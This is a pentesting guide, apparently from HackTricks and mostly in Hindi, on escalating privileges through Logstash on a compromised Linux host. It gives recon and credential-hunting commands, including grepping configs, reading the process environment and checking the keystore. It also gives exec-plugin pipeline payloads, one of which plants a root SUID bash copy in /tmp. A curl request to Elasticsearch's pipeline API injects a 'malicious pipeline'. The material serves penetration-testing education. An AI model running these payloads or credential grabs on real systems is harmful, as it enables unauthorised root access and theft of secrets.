# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash का उपयोग एक ऐसे सिस्टम के माध्यम से लॉग्स को **इकट्ठा, रूपांतरित, और भेजने** के लिए किया जाता है जिसे **pipelines** कहा जाता है। ये pipelines **input**, **filter**, और **output** stages से बने होते हैं। जब Logstash किसी compromised मशीन पर चलता है तो एक दिलचस्प पहलू सामने आता है।

### Pipeline Configuration

Pipelines फ़ाइल **/etc/logstash/pipelines.yml** में कॉन्फ़िगर किए जाते हैं, जो pipeline configurations के स्थानों की सूची देता है:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
यह फ़ाइल बताती है कि पाइपलाइन कॉन्फ़िगरेशन वाली **.conf** फ़ाइलें कहाँ स्थित हैं। जब आप एक **Elasticsearch output module** का उपयोग करते हैं, तो अक्सर **pipelines** में **Elasticsearch credentials** शामिल होते हैं, जिनके पास अक्सर विस्तृत विशेषाधिकार होते हैं क्योंकि Logstash को Elasticsearch में डेटा लिखने की आवश्यकता होती है। कॉन्फ़िगरेशन पाथ्स में wildcards Logstash को निर्दिष्ट डायरेक्टरी में सभी मिलती-जुलती pipelines चलाने की अनुमति देते हैं।

यदि Logstash को `-f <directory>` के साथ शुरू किया जाता है `pipelines.yml` के बजाय, **उस डायरेक्टरी के अंदर की सभी फ़ाइलें अक्षरानुक्रम (lexicographical) क्रम में जोड़ दी जाती हैं और एक ही config के रूप में पार्स की जाती हैं।** इसके दो आक्रमण संबंधी निहितार्थ हैं:

- `000-input.conf` या `zzz-output.conf` जैसी डाली गई फ़ाइल अंतिम pipeline के गठन को बदल सकती है
- एक खराब स्वरूप की फ़ाइल पूरे pipeline के लोड होने से रोक सकती है, इसलिए auto-reload पर निर्भर करने से पहले payloads को सावधानी से सत्यापित करें

### समझौता किए गए होस्ट पर तेज़ अन्वेषण

जिस बॉक्स पर Logstash इंस्टॉल है, वहाँ तुरंत निम्न चीजें जांचें:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
यह भी जांचें कि स्थानीय निगरानी API पहुँच योग्य है या नहीं। डिफ़ॉल्ट रूप से यह **127.0.0.1:9600** पर बाइंड होता है, जो होस्ट पर पहुँचने के बाद आमतौर पर पर्याप्त होता है:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
यह सामान्यतः आपको pipeline IDs, runtime विवरण, और यह पुष्टि देता है कि आपका संशोधित pipeline लोड हो गया है।

Logstash से प्राप्त क्रेडेंशियल सामान्यतः **Elasticsearch** को अनलॉक कर देते हैं, इसलिए [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md) देखें।

### Privilege Escalation via Writable Pipelines

To attempt privilege escalation, पहले पहचानें कि Logstash service किस user के तहत चल रही है — आमतौर पर **logstash** user। सुनिश्चित करें कि आप इन मानदंडों में से **एक** पूरा करते हैं:

- किसी pipeline **.conf** फ़ाइल पर **write access** होना **या**
- **/etc/logstash/pipelines.yml** फ़ाइल में wildcard का उपयोग हो रहा हो, और आप target फ़ोल्डर में लिख सकें

अतिरिक्त रूप से, इन स्थितियों में से **एक** पूरा होना चाहिए:

- Logstash service को restart करने की क्षमता होना **या**
- **/etc/logstash/logstash.yml** फ़ाइल में **config.reload.automatic: true** सेट होना

कॉन्फ़िगरेशन में यदि wildcard मौजूद है, तो ऐसी फ़ाइल बनाना जो उस wildcard से मेल खाती हो, कमांड निष्पादन की अनुमति देता है। उदाहरण के लिए:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
यहाँ, **interval** सेकंड में निष्पादन की आवृत्ति निर्धारित करता है। दिए गए उदाहरण में, **whoami** कमांड हर 120 सेकंड पर चलता है, और इसका आउटपुट **/tmp/output.log** पर भेजा जाता है।

यदि **/etc/logstash/logstash.yml** में **config.reload.automatic: true** सेट है, तो Logstash बिना रिस्टार्ट के नए या संशोधित pipeline कॉन्फ़िगरेशन को अपने आप पहचानकर लागू कर देगा। यदि कोई wildcard नहीं है, तो मौजूदा कॉन्फ़िगरेशन में बदलाव किए जा सकते हैं, लेकिन व्यवधान से बचने के लिए सावधानी बरतनी चाहिए।

### More Reliable Pipeline Payloads

The `exec` input plugin अभी भी हाल की रिलीज़ में काम करता है और इसके लिए या तो `interval` या `schedule` की आवश्यकता होती है। यह **forking** के द्वारा Logstash JVM में निष्पादित होता है, इसलिए यदि मेमोरी तंग है तो आपका payload चुपचाप चलने के बजाय `ENOMEM` के साथ असफल हो सकता है।

एक अधिक व्यावहारिक privilege-escalation payload आम तौर पर वह होता है जो एक स्थायी artifact छोड़ता है:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
यदि आपके पास रीस्टार्ट करने के अधिकार नहीं हैं लेकिन आप प्रक्रिया को सिग्नल कर सकते हैं, तो Logstash Unix-जैसी प्रणालियों पर **SIGHUP**-ट्रिगर किए गए रीलोड का भी समर्थन करता है:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
ध्यान रखें कि हर प्लगइन reload-friendly नहीं होता। उदाहरण के लिए, **stdin** input automatic reload को रोकता है, इसलिए यह मत मानें कि `config.reload.automatic` हमेशा आपके बदलावों को पकड़ लेगा।

### Logstash से गुप्त जानकारी निकालना

केवल कोड निष्पादन पर ध्यान केंद्रित करने से पहले, Logstash के पास पहले से उपलब्ध डेटा इकट्ठा करें:

- Plaintext credentials अक्सर `elasticsearch {}` outputs, `http_poller`, JDBC inputs, या cloud-related settings के अंदर हार्डकोड किए रहते हैं
- Secure settings संभवतः **`/etc/logstash/logstash.keystore`** या किसी अन्य `path.settings` डायरेक्टरी में रहते हैं
- Keystore password अक्सर **`LOGSTASH_KEYSTORE_PASS`** के माध्यम से दिया जाता है, और पैकेज-आधारित इंस्टाल आमतौर पर इसे **`/etc/sysconfig/logstash`** से स्रोत करते हैं
- Environment-variable expansion `${VAR}` को Logstash स्टार्टअप पर resolve किया जाता है, इसलिए service environment की जांच करना उपयोगी है

उपयोगी जांच:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
यह भी जाँचने लायक है क्योंकि **CVE-2023-46672** ने दिखाया कि विशिष्ट परिस्थितियों में Logstash कुछ संवेदनशील जानकारी लॉग्स में रिकॉर्ड कर सकता है। एक post-exploitation host पर, पुराने Logstash लॉग और `journald` एंट्रीज़ इसलिए क्रेडेंशियल्स उजागर कर सकते हैं, भले ही वर्तमान config secrets को inline स्टोर करने के बजाय keystore को संदर्भित कर रहा हो।

### केंद्रीकृत पाइपलाइन प्रबंधन का दुरुपयोग

कुछ वातावरणों में, host बिल्कुल भी स्थानीय `.conf` फाइलों पर निर्भर नहीं करता। यदि **`xpack.management.enabled: true`** कॉन्फ़िगर है, तो Logstash centrally managed pipelines को Elasticsearch/Kibana से खींच सकता है, और इस मोड को सक्षम करने के बाद local pipeline configs अब सत्य का स्रोत नहीं रहते।

इसका मतलब एक अलग हमला मार्ग है:

1. Elastic credentials को स्थानीय Logstash settings, keystore, या logs से पुनर्प्राप्त करें
2. सत्यापित करें कि खाते के पास **`manage_logstash_pipelines`** cluster privilege है या नहीं
3. एक centrally managed pipeline बनाएँ या बदलें ताकि Logstash host आपके payload को उसके अगले poll interval पर execute करे

इस फीचर के लिए प्रयुक्त Elasticsearch API है:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
यह विशेष रूप से तब उपयोगी होता है जब स्थानीय फ़ाइलें केवल-पढ़ने योग्य (read-only) हों, लेकिन Logstash पहले से ही दूरस्थ रूप से pipelines प्राप्त करने के लिए पंजीकृत हो।

## संदर्भ

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
